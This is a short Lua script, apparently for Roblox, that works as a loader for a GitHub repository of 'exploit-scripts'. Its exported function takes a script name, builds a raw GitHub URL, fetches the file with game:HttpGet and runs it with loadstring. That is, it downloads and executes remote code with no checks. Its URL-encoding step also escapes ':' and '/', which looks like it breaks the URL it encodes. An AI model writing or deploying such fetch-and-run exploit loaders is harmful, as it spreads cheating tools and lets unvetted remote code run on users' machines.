local base_url = "https://raw.githubusercontent.com/Whomever0/exploit-scripts/master/scripts/%s.lua"

local function hex(c)
    return string.format("%%%02X", string.byte(c))
end

local function urlencode(url)
    if url == nil then
        return url
    end
    url = url:gsub("([^%w _%%%-%.~])", hex)
    return url
end

return function(dad)
    local url = urlencode(string.format(base_url, dad));
    return loadstring(game:HttpGet(url, false))();
end